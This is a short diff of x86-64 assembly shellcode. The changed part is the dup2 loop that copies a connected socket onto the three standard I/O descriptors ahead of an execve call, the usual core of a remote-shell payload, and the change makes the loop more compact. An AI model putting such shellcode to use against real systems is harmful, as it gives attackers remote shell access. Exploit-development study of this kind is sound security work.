@@ -50,13 +50,14 @@ BITS 64
 ; dup2(connected socket, {all three standard I/O file descriptors})
 ; int dup2(int oldfd, int newfd);
   mov rdi, rax      ; move socket FD in rdi
+  xor rax, rax
+  push byte 0x2
+  pop rsi
 dup_loop:
-  push BYTE 0x21    ; dup2  syscall #33
-  pop rax
+  mov BYTE al, 0x21    ; dup2  syscall #33
   syscall
-  inc rsi
-  cmp BYTE sil, 2
-  jle dup_loop
+  dec rsi
+  jns dup_loop
 
 ; execve(const char *filename, char *const argv [], char *const envp[])
   xor rax, rax
